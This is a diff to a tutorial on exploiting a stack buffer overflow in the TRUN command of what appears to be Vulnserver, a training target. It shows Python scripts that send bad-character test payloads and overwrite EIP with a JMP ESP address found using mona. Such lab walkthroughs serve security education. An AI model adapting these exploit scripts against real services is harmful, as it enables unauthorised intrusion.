@@ -206,44 +206,76 @@ When crafting shellcode, we need to avoid "bad characters" that might break our 
 import socket
 import struct
 
-# Variables
-offset = 2003
+all_characters = b"".join([ struct.pack('<B', x) for x in range(1, 256) ])
+
+s = socket.socket()
+s.connect(("192.168.177.130", 9999))
+
 total_length = 2984
+offset = 2003
+New_EIP = b"BBBB"
 
-# All possible bytes
-all_chars = b""
-for i in range(1, 256):  # Skip null byte (0x00)
-    all_chars += struct.pack("B", i)
+payload = [
+        b"TRUN /.:/",
+        b"A"*offset,
+        New_EIP,
+        all_characters,
+        b"C"*(total_length-offset-len(New_EIP)-len(all_characters))
+]
 
-# Build our buffer
-buffer = b"TRUN /.:/" 
-buffer += b"A" * offset
-buffer += b"B" * 4
-buffer += all_chars
-buffer += b"C" * (total_length - offset - 4 - len(all_chars))
+payload = b"".join(payload)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.0.98", 9999))
-s.recv(1024)
-s.send(buffer)
+s.send(payload)
+
 s.close()
-
-print("Testing for bad characters...")
 ```
 
 After examining memory in Immunity Debugger, we'll find only the null byte (0x00) is a bad character.
+
+![all characters](Images/image10.png)
 
 ## Step 6: Finding a JMP ESP Instruction
 
 Now we need to find a JMP ESP instruction to use as our return address. We'll use the Mona plugin in Immunity Debugger:
 
 ```
-!mona jmp -r esp -cpb "\x00"
+!mona jmp -r esp
 ```
 
-This command finds all JMP ESP instructions, excluding those with addresses containing null bytes. We'll find an address like `0x62501203`.
+This command finds all JMP ESP instructions, We could use an address like `0x62501203`.
 
 ![mona](Images/image9.png)
+
+Convert this hex address to its little endian format using `Struct` Python built-in library:
+
+```python
+#!/usr/bin/python3
+import socket
+import struct 
+
+s = socket.socket()
+s.connect(("192.168.177.130", 9999))
+
+
+total_length = 2984
+offset = 2003
+New_EIP = struct.pack("<I", 0x62501203)
+
+payload = [
+        b"TRUN /.:/",
+        b"A"*offset,
+        New_EIP,
+        b"C"*(total_length-offset-len(New_EIP))
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+```
+
+After we execute this, we'll take control of the stack `ESP` pointing at.
 
 ## Step 7: Building the Final Exploit
 
